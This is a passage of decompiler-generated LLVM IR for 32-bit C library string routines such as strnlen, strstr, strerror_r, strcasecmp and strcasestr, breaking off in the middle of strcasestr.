
dec_label_pc_8052877:                             ; preds = %dec_label_pc_8052871
  %v1_8052877 = add i32 %v0_805286e.pre, -1
  store i32 %v1_8052877, i32* %ecx.global-to-local, align 4
  %v2_8052878 = sext i8 %v2_8052871 to i32
  %v4_8052878 = inttoptr i32 %v8_8052872 to i8*
  %v5_8052878 = call i8* @_memset(i8* %v4_8052878, i32 %v2_8052878, i32 %v1_8052877)
  %v6_8052878 = ptrtoint i8* %v5_8052878 to i32
  store i32 %v6_8052878, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_805286e, %dec_label_pc_8052877
  %v2_805287e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805287e, i32* @edx, align 4
  %v2_805287f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805287f, i32* @esi, align 4
  ret i32 %v4_8052869

; uselistorder directives
  uselistorder i32 %v8_8052872, { 0, 2, 1 }
  uselistorder i8 %v2_8052871, { 0, 2, 1 }
  uselistorder i32 %v1_805286e, { 1, 0 }
  uselistorder i32 %v4_8052869, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %v4_8052884 = ptrtoint i8* %tmp4 to i32
  %v8_80528978 = icmp eq i32 %tmp, 0
  %v1_805289810 = icmp eq i1 %v8_80528978, false
  br i1 %v1_805289810, label %dec_label_pc_8052891, label %dec_label_pc_805289a

dec_label_pc_8052891:                             ; preds = %entry, %dec_label_pc_8052896
  %v1_805289712 = phi i32 [ %v1_8052897, %dec_label_pc_8052896 ], [ %tmp, %entry ]
  %v0_805289a11 = phi i32 [ %v1_8052896, %dec_label_pc_8052896 ], [ %v4_8052884, %entry ]
  %v1_8052891 = inttoptr i32 %v0_805289a11 to i8*
  %v2_8052891 = load i8, i8* %v1_8052891, align 1
  %v3_8052891 = icmp eq i8 %v2_8052891, 0
  br i1 %v3_8052891, label %dec_label_pc_805289a, label %dec_label_pc_8052896

dec_label_pc_8052896:                             ; preds = %dec_label_pc_8052891
  %v1_8052896 = add i32 %v0_805289a11, 1
  %v1_8052897 = add i32 %v1_805289712, -1
  %v8_8052897 = icmp eq i32 %v1_8052897, 0
  %v1_8052898 = icmp eq i1 %v8_8052897, false
  br i1 %v1_8052898, label %dec_label_pc_8052891, label %dec_label_pc_805289a

dec_label_pc_805289a:                             ; preds = %dec_label_pc_8052896, %dec_label_pc_8052891, %entry
  %v0_805289a.lcssa = phi i32 [ %v4_8052884, %entry ], [ %v0_805289a11, %dec_label_pc_8052891 ], [ %v1_8052896, %dec_label_pc_8052896 ]
  %v2_805289a = sub i32 %v0_805289a.lcssa, %v4_8052884
  ret i32 %v2_805289a

; uselistorder directives
  uselistorder i32 %v1_8052897, { 1, 0 }
  uselistorder i32 %v0_805289a11, { 0, 2, 1 }
  uselistorder i32 %v4_8052884, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052891, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_80528a3 = load i32, i32* @ebx, align 4
  %v4_80528a7 = ptrtoint i8* %arg2 to i32
  %v2_80528af = load i8, i8* %arg2, align 1
  %v1_80528b2 = icmp eq i8 %v2_80528af, 0
  br i1 %v1_80528b2, label %dec_label_pc_8052966, label %dec_label_pc_80528bd

dec_label_pc_80528bd:                             ; preds = %entry
  %v1_80528bd = add i32 %arg1, -1
  br label %dec_label_pc_80528be

dec_label_pc_80528be:                             ; preds = %dec_label_pc_80528ca, %dec_label_pc_80528bd
  %v0_80528be = phi i32 [ %v1_80528be, %dec_label_pc_80528ca ], [ %v1_80528bd, %dec_label_pc_80528bd ]
  %v1_80528be = add i32 %v0_80528be, 1
  %v1_80528bf = inttoptr i32 %v1_80528be to i8*
  %v2_80528bf = load i8, i8* %v1_80528bf, align 1
  %v1_80528c2 = icmp eq i8 %v2_80528bf, 0
  br i1 %v1_80528c2, label %dec_label_pc_8052964, label %dec_label_pc_80528ca

dec_label_pc_80528ca:                             ; preds = %dec_label_pc_80528be
  %v14_80528ca = icmp eq i8 %v2_80528bf, %v2_80528af
  %v1_80528cd = icmp eq i1 %v14_80528ca, false
  br i1 %v1_80528cd, label %dec_label_pc_80528be, label %dec_label_pc_80528cf

dec_label_pc_80528cf:                             ; preds = %dec_label_pc_80528ca
  %v1_80528cf = add i32 %v4_80528a7, 1
  %v2_80528d6 = inttoptr i32 %v1_80528cf to i8*
  %v3_80528d6 = load i8, i8* %v2_80528d6, align 1
  %v1_80528da = icmp eq i8 %v3_80528d6, 0
  br i1 %v1_80528da, label %dec_label_pc_8052966, label %dec_label_pc_80528e2

dec_label_pc_80528e2:                             ; preds = %dec_label_pc_80528cf
  %v1_80528e2 = add i32 %v0_80528be, 2
  %v1_805292c = add i32 %v4_80528a7, 2
  %v2_805292c = inttoptr i32 %v1_805292c to i8*
  br label %dec_label_pc_8052918

dec_label_pc_80528ed:                             ; preds = %dec_label_pc_805295c
  %v2_80528ed = inttoptr i32 %v0_805291e to i8*
  %v3_80528ed = load i8, i8* %v2_80528ed, align 1
  br label %dec_label_pc_805290b.preheader

dec_label_pc_805290b.preheader:                   ; preds = %dec_label_pc_80528ed, %dec_label_pc_8052918
  %v0_80528f6.ph.in = phi i8 [ %v4_80528e2.sink.in, %dec_label_pc_8052918 ], [ %v3_80528ed, %dec_label_pc_80528ed ]
  %v14_805290b45 = icmp eq i8 %v0_80528f6.ph.in, %v2_80528af
  %v1_805290e47 = icmp eq i1 %v14_805290b45, false
  br i1 %v1_805290e47, label %dec_label_pc_80528f6, label %dec_label_pc_8052910

dec_label_pc_80528f6:                             ; preds = %dec_label_pc_805290b.preheader, %dec_label_pc_8052907
  %v0_80528f649.in = phi i8 [ %v2_8052908, %dec_label_pc_8052907 ], [ %v0_80528f6.ph.in, %dec_label_pc_805290b.preheader ]
  %v0_80528fa48 = phi i32 [ %v1_8052907, %dec_label_pc_8052907 ], [ %v0_805291e, %dec_label_pc_805290b.preheader ]
  %v1_80528f6 = icmp eq i8 %v0_80528f649.in, 0
  br i1 %v1_80528f6, label %dec_label_pc_8052964, label %dec_label_pc_80528fa

dec_label_pc_80528fa:                             ; preds = %dec_label_pc_80528f6
  %v1_80528fa = add i32 %v0_80528fa48, 1
  %v1_80528fb = inttoptr i32 %v1_80528fa to i8*
  %v2_80528fb = load i8, i8* %v1_80528fb, align 1
  %v14_80528fe = icmp eq i8 %v2_80528fb, %v2_80528af
  br i1 %v14_80528fe, label %dec_label_pc_8052910, label %dec_label_pc_8052903

dec_label_pc_8052903:                             ; preds = %dec_label_pc_80528fa
  %v1_8052903 = icmp eq i8 %v2_80528fb, 0
  br i1 %v1_8052903, label %dec_label_pc_8052964, label %dec_label_pc_8052907

dec_label_pc_8052907:                             ; preds = %dec_label_pc_8052903
  %v1_8052907 = add i32 %v0_80528fa48, 2
  %v1_8052908 = inttoptr i32 %v1_8052907 to i8*
  %v2_8052908 = load i8, i8* %v1_8052908, align 1
  %v14_805290b = icmp eq i8 %v2_8052908, %v2_80528af
  %v1_805290e = icmp eq i1 %v14_805290b, false
  br i1 %v1_805290e, label %dec_label_pc_80528f6, label %dec_label_pc_8052910

dec_label_pc_8052910:                             ; preds = %dec_label_pc_8052907, %dec_label_pc_80528fa, %dec_label_pc_805290b.preheader
  %v0_8052910 = phi i32 [ %v0_805291e, %dec_label_pc_805290b.preheader ], [ %v1_80528fa, %dec_label_pc_80528fa ], [ %v1_8052907, %dec_label_pc_8052907 ]
  %v1_8052910 = add i32 %v0_8052910, 1
  br label %dec_label_pc_8052918

dec_label_pc_8052918:                             ; preds = %dec_label_pc_80528e2, %dec_label_pc_8052910
  %v0_805291e = phi i32 [ %v1_80528e2, %dec_label_pc_80528e2 ], [ %v1_8052910, %dec_label_pc_8052910 ]
  %v4_80528e2.sink.in.in.in = phi i32 [ %v1_80528e2, %dec_label_pc_80528e2 ], [ %v1_8052910, %dec_label_pc_8052910 ]
  %v4_80528e2.sink.in.in = inttoptr i32 %v4_80528e2.sink.in.in.in to i8*
  %v4_80528e2.sink.in = load i8, i8* %v4_80528e2.sink.in.in, align 1
  %storemerge4 = icmp eq i8 %v4_80528e2.sink.in, %v3_80528d6
  %v1_8052918 = icmp eq i1 %storemerge4, false
  br i1 %v1_8052918, label %dec_label_pc_805290b.preheader, label %dec_label_pc_805291a

dec_label_pc_805291a:                             ; preds = %dec_label_pc_8052918
  %v1_805291e = add i32 %v0_805291e, 1
  %v1_8052925 = add i32 %v0_805291e, -1
  %v2_8052928 = inttoptr i32 %v1_805291e to i8*
  %v3_8052928 = load i8, i8* %v2_8052928, align 1
  %v4_8052928 = zext i8 %v3_8052928 to i32
  %v3_805292c = load i8, i8* %v2_805292c, align 1
  %v4_805292c = zext i8 %v3_805292c to i32
  %v12_8052931 = icmp eq i8 %v3_8052928, %v3_805292c
  %v1_8052933 = icmp eq i1 %v12_8052931, false
  br i1 %v1_8052933, label %dec_label_pc_805295c, label %dec_label_pc_8052935

dec_label_pc_8052935:                             ; preds = %dec_label_pc_805291a, %dec_label_pc_8052949
  %v0_805294c = phi i32 [ %v1_805294c, %dec_label_pc_8052949 ], [ %v1_805292c, %dec_label_pc_805291a ]
  %v0_8052949 = phi i32 [ %v1_8052949, %dec_label_pc_8052949 ], [ %v1_805291e, %dec_label_pc_805291a ]
  %v0_8052935 = phi i32 [ %v3_805294f, %dec_label_pc_8052949 ], [ %v4_8052928, %dec_label_pc_805291a ]
  %v1_8052935 = icmp eq i32 %v0_8052935, 0
  br i1 %v1_8052935, label %dec_label_pc_8052966, label %dec_label_pc_8052939

dec_label_pc_8052939:                             ; preds = %dec_label_pc_8052935
  %v1_8052939 = add i32 %v0_8052949, 1
  %v2_8052939 = inttoptr i32 %v1_8052939 to i8*
  %v3_8052939 = load i8, i8* %v2_8052939, align 1
  %v1_805293d = add i32 %v0_805294c, 1
  %v2_805293d = inttoptr i32 %v1_805293d to i8*
  %v3_805293d = load i8, i8* %v2_805293d, align 1
  %v4_805293d = zext i8 %v3_805293d to i32
  %v12_8052941 = icmp eq i8 %v3_8052939, %v3_805293d
  %v1_8052943 = icmp eq i1 %v12_8052941, false
  br i1 %v1_8052943, label %dec_label_pc_805295c, label %dec_label_pc_8052945

dec_label_pc_8052945:                             ; preds = %dec_label_pc_8052939
  %v1_8052945 = icmp eq i8 %v3_805293d, 0
  br i1 %v1_8052945, label %dec_label_pc_8052966, label %dec_label_pc_8052949

dec_label_pc_8052949:                             ; preds = %dec_label_pc_8052945
  %v1_8052949 = add i32 %v0_8052949, 2
  %v1_805294c = add i32 %v0_805294c, 2
  %v1_805294f = inttoptr i32 %v1_805294c to i8*
  %v2_805294f = load i8, i8* %v1_805294f, align 1
  %v3_805294f = zext i8 %v2_805294f to i32
  %v1_8052953 = inttoptr i32 %v1_8052949 to i8*
  %v2_8052953 = load i8, i8* %v1_8052953, align 1
  %v12_8052956 = icmp eq i8 %v2_8052953, %v2_805294f
  br i1 %v12_8052956, label %dec_label_pc_8052935, label %dec_label_pc_805295a

dec_label_pc_805295a:                             ; preds = %dec_label_pc_8052949
  br label %dec_label_pc_805295c

dec_label_pc_805295c:                             ; preds = %dec_label_pc_8052939, %dec_label_pc_805291a, %dec_label_pc_805295a
  %v0_805295c = phi i32 [ %v4_805292c, %dec_label_pc_805291a ], [ %v3_805294f, %dec_label_pc_805295a ], [ %v4_805293d, %dec_label_pc_8052939 ]
  %v1_805295c = icmp eq i32 %v0_805295c, 0
  %v1_805295e = icmp eq i1 %v1_805295c, false
  br i1 %v1_805295e, label %dec_label_pc_80528ed, label %dec_label_pc_8052966

dec_label_pc_8052964:                             ; preds = %dec_label_pc_80528be, %dec_label_pc_8052903, %dec_label_pc_80528f6
  br label %dec_label_pc_8052966

dec_label_pc_8052966:                             ; preds = %dec_label_pc_805295c, %dec_label_pc_8052935, %dec_label_pc_8052945, %entry, %dec_label_pc_80528cf, %dec_label_pc_8052964
  %storemerge2 = phi i32 [ 0, %dec_label_pc_8052964 ], [ %v1_80528be, %dec_label_pc_80528cf ], [ %arg1, %entry ], [ %v1_8052925, %dec_label_pc_8052945 ], [ %v1_8052925, %dec_label_pc_8052935 ], [ %v1_8052925, %dec_label_pc_805295c ]
  store i32 %v0_80528a3, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_805294c, { 1, 0 }
  uselistorder i32 %v1_8052949, { 1, 0 }
  uselistorder i8 %v3_805293d, { 1, 0, 2 }
  uselistorder i8 %v4_80528e2.sink.in, { 1, 0 }
  uselistorder i32 %v0_805291e, { 4, 3, 2, 1, 0 }
  uselistorder i8 %v2_8052908, { 1, 0 }
  uselistorder i32 %v1_8052907, { 0, 2, 1 }
  uselistorder i8 %v2_80528fb, { 1, 0 }
  uselistorder i32 %v0_80528fa48, { 1, 0 }
  uselistorder i32 %v1_80528be, { 0, 2, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052966, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_8052964, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805295c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052935, { 1, 0 }
  uselistorder label %dec_label_pc_8052918, { 1, 0 }
  uselistorder label %dec_label_pc_80528f6, { 1, 0 }
  uselistorder label %dec_label_pc_805290b.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_8052981 = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_8052989 = load i32, i32* @ebx, align 4
  ret i32 %v0_8052989
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_80529a2 = icmp ugt i32 %arg1, 124
  br i1 %v6_80529a2, label %dec_label_pc_80529bf, label %dec_label_pc_80529a4

dec_label_pc_80529a4:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_8059d80.481 to i32), i32* @esi, align 4
  %v1_80529b44 = icmp eq i32 %arg1, 0
  %v1_80529b611 = icmp eq i1 %v1_80529b44, false
  br i1 %v1_80529b611, label %dec_label_pc_80529ad, label %dec_label_pc_80529b8

dec_label_pc_80529ad:                             ; preds = %dec_label_pc_80529a4, %dec_label_pc_80529ad
  %v0_80529b0 = phi i32 [ %v3_80529b0, %dec_label_pc_80529ad ], [ %arg1, %dec_label_pc_80529a4 ]
  %v0_80529b3 = phi i32 [ %v1_80529b3, %dec_label_pc_80529ad ], [ ptrtoint ([8 x i8]* @global_var_8059d80.481 to i32), %dec_label_pc_80529a4 ]
  %v1_80529ad = inttoptr i32 %v0_80529b3 to i8*
  %v2_80529ad = load i8, i8* %v1_80529ad, align 1
  %v7_80529ad = icmp eq i8 %v2_80529ad, 0
  %v2_80529b0 = zext i1 %v7_80529ad to i32
  %v3_80529b0 = add i32 %v2_80529b0, %v0_80529b0
  %v16_80529b0 = icmp eq i32 %v3_80529b0, 0
  %v1_80529b3 = add i32 %v0_80529b3, 1
  store i32 %v1_80529b3, i32* @esi, align 4
  %v1_80529b6 = icmp eq i1 %v16_80529b0, false
  br i1 %v1_80529b6, label %dec_label_pc_80529ad, label %dec_label_pc_80529b8

dec_label_pc_80529b8:                             ; preds = %dec_label_pc_80529ad, %dec_label_pc_80529a4
  %v0_80529ba = phi i32 [ ptrtoint ([8 x i8]* @global_var_8059d80.481 to i32), %dec_label_pc_80529a4 ], [ %v1_80529b3, %dec_label_pc_80529ad ]
  store i32 0, i32* @ebp, align 4
  %v1_80529ba = inttoptr i32 %v0_80529ba to i8*
  %v2_80529ba = load i8, i8* %v1_80529ba, align 1
  %v3_80529ba = icmp eq i8 %v2_80529ba, 0
  %v1_80529bd = icmp eq i1 %v3_80529ba, false
  br i1 %v1_80529bd, label %dec_label_pc_80529b8.dec_label_pc_80529ee_crit_edge, label %dec_label_pc_80529bf

dec_label_pc_80529b8.dec_label_pc_80529ee_crit_edge: ; preds = %dec_label_pc_80529b8
  br label %dec_label_pc_80529ee

dec_label_pc_80529bf:                             ; preds = %dec_label_pc_80529b8, %entry
  %v1_80529c2 = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  store i32 22, i32* @ebp, align 4
  %v6_80529d3 = bitcast i32* %stack_var_-17 to i8*
  %v7_80529d3 = call i32 @_uintmaxtostr(i8* %v6_80529d3, i32 %arg1, i32 %v1_80529c2, i32 -10, i32 0)
  %v1_80529e2 = add i32 %v7_80529d3, -14
  store i32 %v1_80529e2, i32* @esi, align 4
  %v5_80529e5 = inttoptr i32 %v1_80529e2 to i8*
  store i8* %v5_80529e5, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_80529e2 to i16*
  %v6_80529e6 = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_8059d56.482 to i32), i32 14)
  %v1_80529f8.pre = load i32, i32* @edi, align 4
  %v0_80529fe.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80529ee

dec_label_pc_80529ee:                             ; preds = %dec_label_pc_80529b8.dec_label_pc_80529ee_crit_edge, %dec_label_pc_80529bf
  %v0_80529fe = phi i32 [ %v0_80529ba, %dec_label_pc_80529b8.dec_label_pc_80529ee_crit_edge ], [ %v0_80529fe.pre, %dec_label_pc_80529bf ]
  %v1_80529f8 = phi i32 [ %arg3, %dec_label_pc_80529b8.dec_label_pc_80529ee_crit_edge ], [ %v1_80529f8.pre, %dec_label_pc_80529bf ]
  %v4_80529ee = icmp eq i32 %arg2, 0
  %v3_80529f8 = select i1 %v4_80529ee, i32 0, i32 %v1_80529f8
  store i32 %v3_80529f8, i32* @edi, align 4
  %v5_80529fe = inttoptr i32 %v0_80529fe to i8*
  store i8* %v5_80529fe, i8** %stack_var_-108, align 4
  %v3_80529ff = call i32 @strlen(i8* %v5_80529fe)
  %v1_8052a07 = add i32 %v3_80529ff, 1
  store i32 %v1_8052a07, i32* %ebx.global-to-local, align 4
  %v1_8052a0a = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_8052a07, %v1_8052a0a
  br i1 %tmp, label %dec_label_pc_8052a0e, label %dec_label_pc_8052a15

dec_label_pc_8052a0e:                             ; preds = %dec_label_pc_80529ee
  store i32 %v1_8052a0a, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_8052a15

dec_label_pc_8052a15:                             ; preds = %dec_label_pc_80529ee, %dec_label_pc_8052a0e
  %v0_8052a1a = phi i32 [ %v1_8052a07, %dec_label_pc_80529ee ], [ %v1_8052a0a, %dec_label_pc_8052a0e ]
  %v1_8052a15 = icmp eq i32 %v0_8052a1a, 0
  br i1 %v1_8052a15, label %dec_label_pc_8052a31, label %dec_label_pc_8052a19

dec_label_pc_8052a19:                             ; preds = %dec_label_pc_8052a15
  %v0_8052a1b = load i32, i32* @esi, align 4
  %v8_8052a1c = inttoptr i32 %arg2 to i8*
  store i8* %v8_8052a1c, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_8052a20 = call i32 @memcpy(i16* %tmp45, i32 %v0_8052a1b, i32 %v0_8052a1a)
  %v1_8052a2c = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052a2c = add i32 %arg2, -1
  %v3_8052a2c = add i32 %v2_8052a2c, %v1_8052a2c
  %v4_8052a2c = inttoptr i32 %v3_8052a2c to i8*
  store i8 0, i8* %v4_8052a2c, align 1
  br label %dec_label_pc_8052a31

dec_label_pc_8052a31:                             ; preds = %dec_label_pc_8052a15, %dec_label_pc_8052a19
  %v0_8052a31 = load i32, i32* @ebp, align 4
  %v1_8052a31 = icmp eq i32 %v0_8052a31, 0
  br i1 %v1_8052a31, label %dec_label_pc_8052a3c, label %dec_label_pc_8052a35

dec_label_pc_8052a35:                             ; preds = %dec_label_pc_8052a31
  %v0_8052a35 = load i8*, i8** %stack_var_-108, align 4
  %v1_8052a35 = ptrtoint i8* %v0_8052a35 to i32
  %v2_8052a35 = call i32 @__errno_location(i32 %v1_8052a35)
  %v0_8052a3a = load i32, i32* @ebp, align 4
  %v2_8052a3a = inttoptr i32 %v2_8052a35 to i32*
  store i32 %v0_8052a3a, i32* %v2_8052a3a, align 4
  %v0_8052a3f.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8052a3c

dec_label_pc_8052a3c:                             ; preds = %dec_label_pc_8052a31, %dec_label_pc_8052a35
  %v0_8052a3f = phi i32 [ 0, %dec_label_pc_8052a31 ], [ %v0_8052a3f.pre, %dec_label_pc_8052a35 ]
  ret i32 %v0_8052a3f

; uselistorder directives
  uselistorder i32 %v1_8052a0a, { 1, 2, 0 }
  uselistorder i32 %v1_8052a07, { 1, 0, 2 }
  uselistorder i32 %v1_80529b3, { 0, 2, 1 }
  uselistorder i32 %v3_80529b0, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_8059d80.481 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_8052a3c, { 1, 0 }
  uselistorder label %dec_label_pc_8052a31, { 1, 0 }
  uselistorder label %dec_label_pc_8052a15, { 1, 0 }
  uselistorder label %dec_label_pc_80529ee, { 1, 0 }
  uselistorder label %dec_label_pc_80529ad, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_8052a58 = inttoptr i32 %arg2 to i8*
  %v3_8052a58 = call i32 @memmove(i8* %v2_8052a58, i32 %arg1)
  ret i32 %v3_8052a58
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8052a61 = load i32, i32* bitcast (i32** @global_var_805b500.484 to i32*), align 256
  %v4_8052a6a = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_8052a72

dec_label_pc_8052a72:                             ; preds = %dec_label_pc_8052a8f, %entry
  %storemerge = phi i32 [ %v4_8052a6a, %entry ], [ %v1_8052a90, %dec_label_pc_8052a8f ]
  %v0_8052a90 = phi i32 [ %v4_8052a6a, %entry ], [ %v1_8052a90, %dec_label_pc_8052a8f ]
  %v0_8052a956 = phi i32 [ 0, %entry ], [ %v0_8052a957, %dec_label_pc_8052a8f ]
  %v0_8052a8f = phi i32 [ %arg2, %entry ], [ %v1_8052a8f, %dec_label_pc_8052a8f ]
  store i32 %storemerge, i32* @ecx, align 4
  %v12_8052a72 = icmp eq i32 %v0_8052a90, %v0_8052a8f
  %.pre = inttoptr i32 %v0_8052a90 to i8*
  br i1 %v12_8052a72, label %dec_label_pc_8052a8a, label %dec_label_pc_8052a76

dec_label_pc_8052a76:                             ; preds = %dec_label_pc_8052a72
  %v2_8052a76 = load i8, i8* %.pre, align 1
  %v3_8052a76 = zext i8 %v2_8052a76 to i32
  %v2_8052a79 = mul nuw nsw i32 %v3_8052a76, 2
  %v3_8052a79 = add i32 %v2_8052a79, %v0_8052a61
  %v4_8052a79 = inttoptr i32 %v3_8052a79 to i16*
  %v5_8052a79 = load i16, i16* %v4_8052a79, align 2
  %v6_8052a79 = sext i16 %v5_8052a79 to i32
  %v1_8052a7d = inttoptr i32 %v0_8052a8f to i8*
  %v2_8052a7d = load i8, i8* %v1_8052a7d, align 1
  %v3_8052a7d = zext i8 %v2_8052a7d to i32
  %v2_8052a80 = mul nuw nsw i32 %v3_8052a7d, 2
  %v3_8052a80 = add i32 %v2_8052a80, %v0_8052a61
  %v4_8052a80 = inttoptr i32 %v3_8052a80 to i16*
  %v5_8052a80 = load i16, i16* %v4_8052a80, align 2
  %v6_8052a80 = sext i16 %v5_8052a80 to i32
  %v2_8052a84 = sub nsw i32 %v6_8052a79, %v6_8052a80
  %v12_8052a84 = icmp eq i32 %v2_8052a84, 0
  store i32 %v2_8052a84, i32* @edx, align 4
  %v1_8052a88 = icmp eq i1 %v12_8052a84, false
  br i1 %v1_8052a88, label %dec_label_pc_8052a93, label %dec_label_pc_8052a8a

dec_label_pc_8052a8a:                             ; preds = %dec_label_pc_8052a72, %dec_label_pc_8052a76
  %v0_8052a957 = phi i32 [ %v2_8052a84, %dec_label_pc_8052a76 ], [ %v0_8052a956, %dec_label_pc_8052a72 ]
  %v2_8052a8a = load i8, i8* %.pre, align 1
  %v3_8052a8a = icmp eq i8 %v2_8052a8a, 0
  br i1 %v3_8052a8a, label %dec_label_pc_8052a93, label %dec_label_pc_8052a8f

dec_label_pc_8052a8f:                             ; preds = %dec_label_pc_8052a8a
  %v1_8052a8f = add i32 %v0_8052a8f, 1
  %v1_8052a90 = add i32 %v0_8052a90, 1
  br label %dec_label_pc_8052a72

dec_label_pc_8052a93:                             ; preds = %dec_label_pc_8052a8a, %dec_label_pc_8052a76
  %v0_8052a95 = phi i32 [ %v0_8052a957, %dec_label_pc_8052a8a ], [ %v2_8052a84, %dec_label_pc_8052a76 ]
  ret i32 %v0_8052a95

; uselistorder directives
  uselistorder i32 %v1_8052a90, { 1, 0 }
  uselistorder i32 %v0_8052a957, { 1, 0 }
  uselistorder i32 %v2_8052a84, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8052a8f, { 1, 2, 0 }
  uselistorder i32 %v0_8052a90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052a8a, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8052a9b = load i32, i32* @ebx, align 4
  %v4_8052a9f = ptrtoint i8* %arg1 to i32
  %v1_8052aab18 = inttoptr i32 %arg2 to i8*
  %v2_8052aab1932 = load i8, i8* %v1_8052aab18, align 1
  %v4_8052aad2336 = icmp eq i8 %v2_8052aab1932, 0
  %v1_8052aaf2538 = icmp eq i1 %v4_8052aad2336, false
  br i1 %v1_8052aaf2538, label %dec_label_pc_8052ab5.lr.ph.lr.ph, label %dec_label_pc_8052ae5

dec_label_pc_8052ab5.lr.ph.lr.ph:                 ; preds = %entry
  %v3_8052aab2033 = zext i8 %v2_8052aab1932 to i32
  %v4_8052aab.pre.pre = load i32, i32* @eax, align 4
  %v5_8052aab2134 = and i32 %v4_8052aab.pre.pre, -256
  %v6_8052aab2235 = or i32 %v3_8052aab2033, %v5_8052aab2134
  %v4_8052ab5.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052ab5.lr.ph

dec_label_pc_8052ab5.lr.ph:                       ; preds = %dec_label_pc_8052ab5.lr.ph.lr.ph, %dec_label_pc_8052ae0
  %v4_8052ab5.pre = phi i32 [ %v4_8052ab5.pre.pre, %dec_label_pc_8052ab5.lr.ph.lr.ph ], [ %v0_8052abf, %dec_label_pc_8052ae0 ]
  %v6_8052aab2241 = phi i32 [ %v6_8052aab2235, %dec_label_pc_8052ab5.lr.ph.lr.ph ], [ %v6_8052aab22, %dec_label_pc_8052ae0 ]
  %v2_8052aab1940 = phi i8 [ %v2_8052aab1932, %dec_label_pc_8052ab5.lr.ph.lr.ph ], [ %v2_8052aab19, %dec_label_pc_8052ae0 ]
  %v0_8052ae039 = phi i32 [ %v4_8052a9f, %dec_label_pc_8052ab5.lr.ph.lr.ph ], [ %v1_8052ae0, %dec_label_pc_8052ae0 ]
  br label %dec_label_pc_8052ab5

dec_label_pc_8052ab5:                             ; preds = %dec_label_pc_8052ab5.lr.ph, %dec_label_pc_8052ad5
  %v4_8052ab5 = phi i32 [ %v4_8052ab5.pre, %dec_label_pc_8052ab5.lr.ph ], [ %v4_8052ab546, %dec_label_pc_8052ad5 ]
  %v6_8052aab30 = phi i32 [ %v6_8052aab2241, %dec_label_pc_8052ab5.lr.ph ], [ %v6_8052aab, %dec_label_pc_8052ad5 ]
  %v2_8052aab29 = phi i8 [ %v2_8052aab1940, %dec_label_pc_8052ab5.lr.ph ], [ %v2_8052aab, %dec_label_pc_8052ad5 ]
  %v1_8052aab28 = phi i8* [ %v1_8052aab18, %dec_label_pc_8052ab5.lr.ph ], [ %v1_8052aab, %dec_label_pc_8052ad5 ]
  %v0_8052ad527 = phi i32 [ %arg2, %dec_label_pc_8052ab5.lr.ph ], [ %v1_8052ad5, %dec_label_pc_8052ad5 ]
  %v0_8052ad626 = phi i32 [ %v0_8052ae039, %dec_label_pc_8052ab5.lr.ph ], [ %v1_8052ad6, %dec_label_pc_8052ad5 ]
  %v1_8052ab5 = inttoptr i32 %v0_8052ad626 to i8*
  %v2_8052ab5 = load i8, i8* %v1_8052ab5, align 1
  %v3_8052ab5 = zext i8 %v2_8052ab5 to i32
  %v5_8052ab5 = and i32 %v4_8052ab5, -256
  %v6_8052ab5 = or i32 %v5_8052ab5, %v3_8052ab5
  %v15_8052ab7 = icmp eq i8 %v2_8052aab29, %v2_8052ab5
  br i1 %v15_8052ab7, label %dec_label_pc_8052ad5, label %dec_label_pc_8052abf

dec_label_pc_8052abf:                             ; preds = %dec_label_pc_8052ab5
  %v0_8052abf = load i32, i32* bitcast (i32** @global_var_805b500.484 to i32*), align 256
